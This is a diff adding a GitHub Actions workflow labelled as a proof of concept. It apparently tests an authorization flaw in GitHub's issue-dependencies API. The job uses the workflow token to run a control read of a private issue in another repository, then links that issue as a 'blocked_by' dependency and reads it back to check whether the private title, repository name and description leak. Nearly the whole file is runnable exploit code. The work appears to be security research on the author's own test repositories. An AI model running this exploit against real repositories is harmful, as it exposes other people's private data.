@@ -1,0 +1,36 @@
+name: depidor
+on:
+  workflow_dispatch: {}
+permissions:
+  issues: write
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: control-then-exploit
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "=== token-scope: repos this installation token can reach ==="
+          curl -s -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/installation/repositories | python3 -c "import sys,json;
+try:
+ d=json.load(sys.stdin); print('total_count=',d.get('total_count'),'repos=',[r['full_name'] for r in d.get('repositories',[])])
+except Exception as e: print('n/a', e)" || true
+          echo ""
+          echo "=== CONTROL: direct read of PRIVATE si-child issue #1 with repo-scoped token (expect 404) ==="
+          code=$(curl -s -o /tmp/ctrl.json -w '%{http_code}' -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" https://api.github.com/repos/jackpas23/si-child/issues/1)
+          echo "direct GET jackpas23/si-child/issues/1 -> HTTP $code"
+          echo "body: $(head -c 200 /tmp/ctrl.json)"
+          echo ""
+          echo "=== EXPLOIT: POST si-child#1 (id 4661219265) as blocked_by of si-parent#1 ==="
+          pcode=$(curl -s -o /tmp/post.json -w '%{http_code}' -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2026-03-10" https://api.github.com/repos/jackpas23/si-parent/issues/1/dependencies/blocked_by -d '{"issue_id":4661219265}')
+          echo "POST blocked_by -> HTTP $pcode"
+          echo "post-body: $(head -c 120 /tmp/post.json)"
+          echo ""
+          echo "=== READBACK: GET blocked_by — did private title leak? ==="
+          curl -s -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2026-03-10" https://api.github.com/repos/jackpas23/si-parent/issues/1/dependencies/blocked_by -o /tmp/rb.json
+          python3 -c "import json;
+d=json.load(open('/tmp/rb.json'))
+for i in d:
+ r=i.get('repository',{})
+ print('LEAKED_TITLE='+repr(i.get('title')), 'repo='+repr(r.get('full_name')), 'private='+repr(r.get('private')), 'desc='+repr(r.get('description')))"
